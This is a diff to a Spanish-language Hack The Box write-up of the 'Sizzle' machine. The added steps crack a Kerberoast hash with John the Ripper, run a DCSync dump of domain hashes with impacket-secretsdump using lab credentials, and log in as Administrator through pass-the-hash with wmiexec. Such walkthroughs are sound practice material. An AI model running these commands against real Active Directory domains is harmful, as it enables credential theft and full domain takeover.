@@ -348,6 +348,31 @@ Y ejecutamos el Kerberoasting desde nuestro local:
 
     └─# impacket-GetUserSPNs htb.local/amanda:Ashare1972 -request -dc-ip 127.0.0.1
 
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/2f47e318-9e7e-42a9-9939-40528045858c)
+
+Y esta vez podemos crackearlo con JTR:
+
+    └─# john --wordlist=/usr/share/wordlists/rockyou.txt mrlky.hash
+
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/549785b7-906b-4195-a135-e26072932380)
+
+Volviendo a BloodHound, y buscando por nuestro nuevo usuario 'mrlky', vemos que tiene permisos 'DCSync', 'GetChanges' y 'GetChangesAll'.
+
+Con estos permisos, podemos realizar un ataque DCSync utilizando el conjunto de herramientas de Impacket:
+
+    └─# impacket-secretsdump htb.local/mrlky:Football#7@10.10.10.103
+
+Nos devuelve los hashes del dominio, incluido el del usuario 'Administrador':
+
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/35a60bd2-cfcb-4080-ae89-f9749840279e)
+
+Con esto, podemos utilizar 'wmiexec' para acceder como Administrador y obtener los hashes:
+
+    └─# impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :<REDACTED>
+
+
+
+
 
 
 
